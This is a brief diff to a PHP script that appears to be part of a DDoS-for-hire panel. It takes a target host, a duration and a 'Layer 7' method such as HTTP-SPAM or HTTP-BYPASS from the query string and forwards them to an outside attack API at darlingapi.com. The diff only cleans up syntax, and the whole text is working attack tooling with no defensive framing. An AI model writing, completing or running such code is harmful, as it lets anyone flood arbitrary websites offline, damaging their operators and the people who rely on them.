@@ -1,4 +1,3 @@
-
 <?php
 
 //Fields
@@ -8,10 +7,9 @@ $time = $_GET['time'];
 $method = $_GET['method'];
 $mode = $_GET['mode'];
 
-
 //Layer 7 Methods
-if ($method == "HTTP-SPAM") { $method = "SOCKETv2"; $mode = "GET" }
-if ($method == "HTTP-BYPASS") { $method = "SOCKETv3"; $mode = "GET" }
+if ($method == "HTTP-SPAM") $method = "SOCKETv2";
+if ($method == "HTTP-BYPASS") $method = "SOCKETv3";
 
 //API Link
 $Link = "https://darlingapi.com/?key=YOURAPIKEY&host=$host&port=80&time=$time&method=$method&mode=$mode";
